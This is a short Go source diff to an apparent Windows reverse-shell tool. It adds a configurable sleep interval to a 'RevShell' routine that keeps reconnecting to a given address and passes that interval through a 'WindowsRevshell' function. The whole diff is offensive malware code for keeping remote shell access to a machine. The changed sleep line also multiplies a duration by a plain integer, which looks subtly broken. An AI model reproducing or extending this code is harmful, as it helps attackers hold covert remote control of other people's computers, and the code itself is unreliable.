@@ -17,6 +17,7 @@ type Shell interface{
 
 type Commands struct{
   address string
+  SleepTime int
   //conn ...interface{}//*net.Conn
 }
 
@@ -26,7 +27,7 @@ func(com Commands) RevShell(){
     if nil != c {
       c.Close()
     }
-    time.Sleep(time.Second * 5)
+    time.Sleep(time.Second * com.SleepTime)
     com.RevShell()
   }
   r := bufio.NewReader(c)
@@ -61,9 +62,9 @@ func (com Commands) Conn(){
   }
 }
 */
-func WindowsRevshell(addr string){
+func WindowsRevshell(addr string,st int){
   //addr := "0.0.0.0:55677"
   var s Shell
-  s = Commands{addr}
+  s = Commands{addr,st}
   s.RevShell()
 }
